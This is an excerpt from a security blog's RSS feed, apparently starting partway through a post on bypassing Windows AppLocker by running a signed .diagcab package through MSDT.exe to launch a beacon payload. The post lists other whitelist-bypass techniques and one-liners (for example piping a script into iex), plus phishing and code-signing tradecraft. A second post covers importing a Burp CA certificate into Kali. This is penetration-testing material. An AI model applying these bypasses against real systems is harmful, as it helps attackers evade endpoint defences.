&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.38-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.38-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.43.38 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;Click Create -&gt; Yes to Default rules&lt;/blockquote&gt;

&lt;p&gt;At this point go ahead delete the Admin rule that allows and admin to execute any executable, your rules should match this:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.47.01-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.47.01-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.47.01 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Go ahead and setup the Script Rules and block out the temp dir:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.49.18-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.49.18-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.49.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets start up the required services needed for Applocker to enforce rules properly:
    sc config appIDSvc start= auto
    sc start appIDSvc&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.55.18-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.55.18-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.55.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lastly we need to update our Group Policies. Reboot your box and run this (you may have to reboot first, if its domain auth you must have the DC on in your VM environment):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Gpupdatep /force
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So lets test out our new setup in Applocker, first I will attempt to run beacon.exe in my restricted environment:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.29.07-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.29.07-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 10.29.07 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Great this is exactly what we needed to see, now PS in this location:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.36.39-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.36.39-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 10.36.39 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now lets test out our new package:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.38.10-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-10.38.10-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 10.38.10 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Boom! Now we have our payload and the ability to bypass AppLocker using some of the most restrictive settings. Now Nicholas Berthaume didn&amp;rsquo;t talk about this Applocker bypass (maybe I just missed this but this is a pretty sweet technique and all props go out to him)!&lt;/p&gt;

&lt;p&gt;By why does this work? Well we are actually using MSDT.exe to execute our .diagcab package. This is a Microsoft Signed binary which is inherently trusted by Windows! So we can now use this binary to gain code execution just like other App Bypasses using instal-util etc..&lt;/p&gt;

&lt;p&gt;If you don&amp;rsquo;t know much about application whitelist bypasses here is a great list of the current ones that SubTee put out:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt&#34;&gt;https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. IEExec -This technique may work in certain envirionments. Its relies on the fact that many organizations trust executables signed by Microsoft. We can misuse this trust by launching a specially crafted .NET application. Example Here: http://www.room362.com/blog/2014/01/16/application-whitelist-bypass-using-ieexec-dot-exe/
2. Rundll32.exe
3. ClickOnce Applications dfsvc.exe dfshim.dll
4. XBAP - XML Browser Applications WPF PresentationHost.exe    
5. MD5 Hash Collision
 http://www.mathstat.dal.ca/~selinger/md5collision/
6. PowerShell
 Specifically Reflective Execution
 http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
 https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf
7. .HTA Application Invoke PowerShell Scripts
 Launched by mshta.exe, bypasses IE security settings as well.
8. bat, vbs, ps1
 1. cmd.exe /k &amp;lt; script.txt
 2. cscript.exe //E:vbscript script.txt
 3. Get-Content script.txt | iex
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Tradecraft Concerns:&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Phishing should work great, the .diagcab probably won&amp;rsquo;t be inspected by boarder protections? (let me know ppl)&lt;/li&gt;
&lt;li&gt;Code signing cert will need to look legit to the target (so keep that in mind)&lt;/li&gt;
&lt;li&gt;Powershell script can easily be pulled from the package, so use something encrypted for stager&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I really hope you got something out of this! Let me know on twitter @Killswitch_gui what you think or ideas that you have, I love to learn from my peers so let me know what you think or are using this for. All credit for this goes out to:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=-E-JTYjk8_Q&#34;&gt;https://www.youtube.com/watch?v=-E-JTYjk8_Q&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Resources:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/library/ee424379.aspx&#34;&gt;https://technet.microsoft.com/en-us/library/ee424379.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Code Signing Help: &lt;a href=&#34;https://support.globalsign.com/customer/portal/articles/1353601-converting-certificates---openssl&#34;&gt;https://support.globalsign.com/customer/portal/articles/1353601-converting-certificates---openssl&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/dd776530.aspxb&#34;&gt;https://msdn.microsoft.com/en-us/library/dd776530.aspxb&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Simple AppLocker Setup: &lt;a href=&#34;http://www.howtogeek.com/howto/6317/block-users-from-using-certain-applications-with-applocker/&#34;&gt;http://www.howtogeek.com/howto/6317/block-users-from-using-certain-applications-with-applocker/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Importing Burp Suite CA cert .der into Kali for API testing</title>
      <link>https://cybersyndicates.com/2015/10/importing-burp-suite-ca-cert-der-into-kali-for-api-testing/</link>
      <pubDate>Thu, 01 Oct 2015 15:15:53 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2015/10/importing-burp-suite-ca-cert-der-into-kali-for-api-testing/</guid>
      <description>

&lt;h2 id=&#34;importing-burp-suite-ca&#34;&gt;Importing Burp Suite CA&lt;/h2&gt;

&lt;p&gt;Just recently I had to test some API calls with a custom tool written to work with RestClient, unfortunately RestClient uses OpenSSL to check the SSL against the known root CA. This throws a nice error, like invalid certificate error when trying to point your bash shell at the HTTP proxy like Burp. With tons of headache I really couldn&amp;rsquo;t find any good info on importing the SSL certs to Kali from burps CA export function.&lt;/p&gt;

&lt;p&gt;After a bit of research I did however find a few posts for each step, just no in one easy location. Sometimes I write these posts just for my own repository of headache fixes!&lt;/p&gt;

&lt;p&gt;Hope this helps some out, it will help me in the future:&lt;/p&gt;

&lt;h3 id=&#34;step-by-step-execution&#34;&gt;Step-By-Step Execution&lt;/h3&gt;

&lt;p&gt;In Burp go-to Proxy -&amp;gt; Options -&amp;gt; Export CA Certificate:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/10/Screen-Shot-2015-10-01-at-10.52.29-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-01-at-10.52.29-AM.png&#34; alt=&#34;Screen Shot 2015-10-01 at 10.52.29 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Save that cert to your Desktop or anywhere you want really. Now its time convert your cert from a .DER to a .PEM&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl x509 -inform DER -outform PEM -in burpca.der -out myca.crt.pem
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Move cert:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cp  myca.crt.pem /etc/ssl/certs/myca.crt.pem
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go and run just for fun:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;update-ca-certificates
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; Than add your HTTP proxy environmental variable for the RestClient to pick up, most CLI tools do check this for proxy information. This could be helpful for other tools as well.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;export http_proxy=http://127.0.0.1:8080/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; At this point you should be up and running for the use of burp and your API you fuzz.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>